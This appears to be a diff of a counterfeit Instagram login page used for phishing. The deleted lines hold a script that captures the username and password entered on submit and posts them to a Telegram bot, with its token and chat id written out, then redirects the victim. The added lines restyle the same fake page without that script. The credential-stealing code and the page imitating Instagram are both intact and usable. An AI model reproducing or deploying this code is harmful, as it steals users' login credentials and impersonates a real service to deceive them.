@@ -8,7 +8,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #fafafa;
+            background: linear-gradient(to right, #f9a8d4, #b993d6, #6f2f97);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,218 +16,106 @@
             margin: 0;
         }
 
-        .container {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        .login-container {
             width: 100%;
-            max-width: 350px;
+            max-width: 400px;
             padding: 20px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
             border-radius: 10px;
             background-color: #fff;
-        }
-
-        .login-box {
-            width: 100%;
-            padding: 20px;
             text-align: center;
+            border: 1px solid #ddd;
         }
 
-        h1 {
+        .login-container h1 {
+            font-family: 'Billabong', cursive;
             font-size: 3em;
-            color: #262626;
-            margin: 0;
-            font-family: 'Billabong', sans-serif;
+            color: #405DE6;
+            margin-bottom: 20px;
         }
 
-        .facebook-btn {
+        .login-container .logo {
+            width: 100px;
+            margin: 20px auto;
+        }
+
+        .login-container .textbox {
+            margin-bottom: 20px;
+        }
+
+        .login-container .textbox input {
             width: 100%;
             padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .login-container .textbox input:focus {
+            border-color: #405DE6;
+        }
+
+        .login-container .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #405DE6;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .login-container .btn:hover {
+            background-color: #303f9f;
+        }
+
+        .login-container .forgot-link {
+            display: block;
+            color: #405DE6;
+            text-decoration: none;
             margin: 10px 0;
-            background-color: #3897f0;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
         }
 
-        .or-divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-        }
-
-        .or-divider::before,
-        .or-divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #dbdbdb;
-        }
-
-        .or-divider::before {
-            margin-right: .5em;
-        }
-
-        .or-divider::after {
-            margin-left: .5em;
-        }
-
-        .or-divider span {
-            color: #8e8e8e;
-            font-weight: 500;
-            font-size: 13px;
-        }
-
-        .textbox {
-            margin-bottom: 10px;
-        }
-
-        .textbox input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background-color: #fafafa;
-            font-size: 14px;
-        }
-
-        .forgot-link {
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-            margin-top: 10px;
-        }
-
-        .forgot-link:hover {
+        .login-container .forgot-link:hover {
             text-decoration: underline;
         }
 
-        .btn {
-            width: 100%;
-            padding: 10px;
-            background-color: #3897f0;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .signup-link {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            width: 100%;
-            text-align: center;
-            border-radius: 4px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            margin-top: 10px;
-        }
-
-        .signup-link a {
-            color: #3897f0;
-            font-weight: bold;
-            text-decoration: none;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        .meta-footer {
-            text-align: center;
+        .login-container .signup-link {
             margin-top: 20px;
-            font-size: 12px;
-            color: #8e8e8e;
         }
 
-        .meta-footer img {
-            height: 14px;
-            vertical-align: middle;
+        .login-container .signup-link a {
+            color: #405DE6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .login-container .signup-link a:hover {
+            text-decoration: underline;
         }
     </style>
-    <script>
-        let attempts = 0;
-
-        function handleLogin(event) {
-            event.preventDefault();
-            attempts++;
-            const form = document.getElementById('login-form');
-            const formData = new FormData(form);
-            const username = formData.get('username');
-            const password = formData.get('password');
-
-            const telegramApiUrl = `https://api.telegram.org/bot7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0/sendMessage`;
-            const messageData = {
-                chat_id: '6534651073',
-                text: `Login attempt ${attempts}\nUsername: ${username}\nPassword: ${password}`
-            };
-
-            console.log(`Attempt ${attempts}: Sending data to Telegram`);
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(messageData)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Telegram response:', data);
-                if (data.ok) {
-                    console.log('Login attempt successful, redirecting...');
-                    window.location.href = 'Sinsta.html';
-                } else {
-                    console.error('Failed to send message to Telegram');
-                    alert('An error occurred while sending the message. Please try again later.');
-                }
-            })
-            .catch(error => {
-                console.error('Fetch error:', error);
-                alert('An error occurred. Please try again later.');
-            });
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('login-form');
-            form.addEventListener('submit', handleLogin);
-        });
-    </script>
 </head>
 <body>
-    <div class="container">
-        <div class="login-box">
-            <h1>Instagram</h1>
-            <button class="facebook-btn">Continue Using Facebook</button>
-            <div class="or-divider"><span>OR</span></div>
-            <form id="login-form" method="POST">
-                <div class="textbox">
-                    <input type="text" placeholder="Phone number, username, or email address" name="username" required>
-                </div>
-                <div class="textbox">
-                    <input type="password" placeholder="Password" name="password" required>
-                </div>
-                <a href="#" class="forgot-link">Forgotten your password?</a>
-                <button type="submit" class="btn">Log in</button>
-            </form>
-        </div>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+        <form id="login-form" method="POST">
+            <div class="textbox">
+                <input type="text" placeholder="Phone number, username, or email address" name="username" required>
+            </div>
+            <div class="textbox">
+                <input type="password" placeholder="Password" name="password" required>
+            </div>
+            <a href="#" class="forgot-link">Forgotten your password?</a>
+            <button type="submit" class="btn">Log in</button>
+        </form>
         <div class="signup-link">
             <p>Don't have an account? <a href="#">Sign up</a></p>
-        </div>
-        <div class="meta-footer">
-            <p>from <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Meta_Platforms_Inc._logo.svg" alt="Meta"></p>
         </div>
     </div>
 </body>
